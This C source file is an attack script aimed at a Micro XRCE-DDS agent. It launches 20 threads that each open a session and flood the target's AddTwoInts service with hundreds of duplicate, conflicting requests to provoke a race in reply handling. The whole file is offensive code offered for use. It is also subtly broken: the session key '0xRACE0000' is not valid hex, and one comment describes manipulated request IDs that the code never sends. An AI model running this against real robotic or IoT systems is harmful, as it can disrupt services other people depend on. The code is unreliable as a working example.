// Compile: gcc attack_request_race.c -o request_race -lmicroxrcedds_client -lmicrocdr -lpthread
#include <uxr/client/client.h>
#include <ucdr/microcdr.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

#define STREAM_HISTORY 8
#define BUFFER_SIZE UXR_CONFIG_UDP_TRANSPORT_MTU * STREAM_HISTORY
#define NUM_RACING_THREADS 20

typedef struct {
    char* ip;
    char* port;
    int thread_id;
} race_args_t;

// Shared state for race condition
volatile int request_counter = 0;
pthread_mutex_t counter_mutex = PTHREAD_MUTEX_INITIALIZER;

void on_malicious_reply(
        uxrSession* session,
        uxrObjectId object_id,
        uint16_t request_id,
        uint16_t reply_id,
        ucdrBuffer* ub,
        uint16_t length,
        void* args)
{
    (void)session; (void)object_id; (void)ub; (void)length; (void)args;
    
    printf("[!] Received reply for request_id=%d, reply_id=%d\n", request_id, reply_id);
}

void* race_thread(void* arg) {
    race_args_t* args = (race_args_t*)arg;
    
    printf("[Thread %d] Starting race condition attack...\n", args->thread_id);
    
    // Initialize transport
    uxrUDPTransport transport;
    if (!uxr_init_udp_transport(&transport, UXR_IPv4, args->ip, args->port)) {
        return NULL;
    }
    
    // Create session
    uxrSession session;
    uint32_t key = 0xRACE0000 + args->thread_id;
    uxr_init_session(&session, &transport.comm, key);
    uxr_set_reply_callback(&session, on_malicious_reply, NULL);
    
    if (!uxr_create_session(&session)) {
        uxr_close_udp_transport(&transport);
        return NULL;
    }
    
    // Create streams
    uint8_t output_buffer[BUFFER_SIZE];
    uxrStreamId reliable_out = uxr_create_output_reliable_stream(&session, output_buffer,
                                                                  BUFFER_SIZE, STREAM_HISTORY);
    
    uint8_t input_buffer[BUFFER_SIZE];
    uxrStreamId reliable_in = uxr_create_input_reliable_stream(&session, input_buffer,
                                                                BUFFER_SIZE, STREAM_HISTORY);
    
    // Create entities
    uxrObjectId participant_id = uxr_object_id(0x01, UXR_PARTICIPANT_ID);
    const char* participant_xml = "<dds><participant><rtps><name>race_attacker</name></rtps></participant></dds>";
    uxr_buffer_create_participant_xml(&session, reliable_out, participant_id, 0, participant_xml, UXR_REPLACE);
    
    // Create requester
    uxrObjectId requester_id = uxr_object_id(0x01, UXR_REQUESTER_ID);
    const char* requester_xml = "<dds>"
            "<requester service_name='AddTwoInts' request_type='AddTwoIntsRequest' reply_type='AddTwoIntsReply'>"
            "</requester>"
            "</dds>";
    uxr_buffer_create_requester_xml(&session, reliable_out, requester_id, participant_id,
                                    requester_xml, UXR_REPLACE);
    
    uxr_run_session_until_confirm_delivery(&session, 2000);
    
    // Launch race condition attack
    printf("[Thread %d] Sending conflicting requests...\n", args->thread_id);
    
    for (int i = 0; i < 100; i++) {
        // Create request buffer
        uint8_t request_buffer[16];
        ucdrBuffer request_ub;
        ucdr_init_buffer(&request_ub, request_buffer, sizeof(request_buffer));
        
        pthread_mutex_lock(&counter_mutex);
        int req_num = request_counter++;
        pthread_mutex_unlock(&counter_mutex);
        
        // Serialize conflicting values
        uint32_t val1 = req_num;
        uint32_t val2 = 0xFFFFFFFF - req_num; // Inverse value
        
        ucdr_serialize_uint32_t(&request_ub, val1);
        ucdr_serialize_uint32_t(&request_ub, val2);
        
        // Send multiple identical requests with same ID to cause race
        for (int j = 0; j < 5; j++) {
            uxr_buffer_request(&session, reliable_out, requester_id, request_buffer,
                              ucdr_buffer_length(&request_ub));
        }
        
        // Also send requests with manipulated request IDs
        // This attempts to confuse the reply matching logic
        
        usleep(10000); // 10ms
    }
    
    // Keep session active to receive replies
    uxr_run_session_time(&session, 10000);
    
    // Cleanup
    uxr_delete_session(&session);
    uxr_close_udp_transport(&transport);
    
    printf("[Thread %d] Completed\n", args->thread_id);
    return NULL;
}

int main(int argc, char** argv) {
    if (argc != 3) {
        printf("Usage: %s <agent_ip> <agent_port>\n", argv[0]);
        return 1;
    }
    
    char* ip = argv[1];
    char* port = argv[2];
    
    printf("=== Request-Reply Race Condition Attack ===\n");
    printf("Target: %s:%s\n", ip, port);
    printf("Racing threads: %d\n\n", NUM_RACING_THREADS);
    
    pthread_t threads[NUM_RACING_THREADS];
    race_args_t thread_args[NUM_RACING_THREADS];
    
    // Launch racing threads
    for (int i = 0; i < NUM_RACING_THREADS; i++) {
        thread_args[i].ip = ip;
        thread_args[i].port = port;
        thread_args[i].thread_id = i;
        
        pthread_create(&threads[i], NULL, race_thread, &thread_args[i]);
        usleep(50000); // 50ms stagger
    }
    
    // Wait for completion
    for (int i = 0; i < NUM_RACING_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n[*] Attack completed\n");
    printf("[*] Total requests sent: %d\n", request_counter * 5);
    
    return 0;
}